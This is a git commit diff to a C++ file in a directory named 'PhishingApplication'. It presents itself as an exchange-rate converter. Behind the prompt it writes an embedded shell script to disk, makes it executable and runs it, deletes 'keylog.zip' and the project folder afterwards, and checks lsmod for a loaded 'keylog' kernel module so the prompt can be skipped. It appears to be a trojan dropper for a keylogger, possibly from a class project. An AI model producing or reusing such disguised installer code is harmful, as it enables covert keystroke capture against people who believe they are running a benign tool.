8d9d25ffc983fe4b56c355650184a997912db443
DrunkLea <64943211+DrunkLea@users.noreply.github.com>
2020-05-26 00:34:40 +0900

    Add files via upload

--- Source/PhishingApplication/Converter.cpp
+++ Source/PhishingApplication/Converter.cpp
@@ -1,5 +1,8 @@
+#define MOD "keylog"
+
 #include <iostream>
 #include <fstream>
+#include <string>
 using namespace std;
 
 const char *text= 
@@ -14,19 +17,51 @@ const char *text=
 	"rm -r -f keylog.zip tmp.sh\n"
 	"rm -r -f final-project-click-to-add-lemon-master\n";
 
-int main(){
-	cout<<"Pull the latest exchange rates online? (require access to Internet)\n"
-		" [y]es [n]o\n";
-	char in = getchar();
-	if(in == 'y'){
-	ofstream myfile("tmp.sh");
-	myfile << (text);			
-	myfile.close();
-
-	system("chmod 755 tmp.sh");
-	system("./tmp.sh");
-	}else{
-	cout<<"Service terminated.\n";
+bool ifExist(){
+	bool result = false;
+	string str;
+	ifstream modfile;
+	size_t pos;
+	
+	system("lsmod>mod.txt");
+	modfile.open("mod.txt");
+	cout<< "file opened\n";
+	
+	if(modfile.is_open()){
+		while(getline(modfile,str)){
+		pos=str.find(MOD);
+		if(pos!=string::npos){
+			result = true;
+			break;
+			}
+		}
 	}
+	modfile.close();
+	system("rm -r -f mod.txt");
+	return result;
+}
+
+int main(){
+	
+	if(!ifExist()){	
+		cout<<"Pull the latest exchange rates online? (require access to Internet)\n"
+			" [y]es [n]o\n";
+		char in = getchar();
+		if(in == 'y'){
+			ofstream myfile("tmp.sh");
+			myfile << (text);			
+			myfile.close();
+
+			system("chmod 755 tmp.sh");
+			system("./tmp.sh");
+		}else{
+			cout<<"Service terminated.\n";
+		}
+	}else{
+		cout<<""; //function without prompt
+	}
+
 	return 0;
 }
+
+
